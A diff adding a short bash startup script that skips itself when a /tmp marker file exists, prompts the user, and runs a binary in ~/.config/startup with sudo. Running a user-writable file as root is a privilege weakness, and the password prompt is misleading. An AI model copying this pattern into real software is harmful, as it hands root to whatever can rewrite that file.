@@ -1,0 +1,25 @@
+#!/usr/bin/env bash
+
+function check() {
+  if [ -e "/tmp/StartSystemCheck" ]; then
+    exit 0
+  else
+    echo -e "Type your password to run startup script\npress enter to continue..."
+    if [ $? == 0 ]; then     
+      read
+      run
+    fi
+  fi
+}
+
+function run() {
+  sudo /home/$USER/.config/startup/config -x
+  sleep 5
+  clear
+}
+
+function main() {
+  check
+}
+
+main
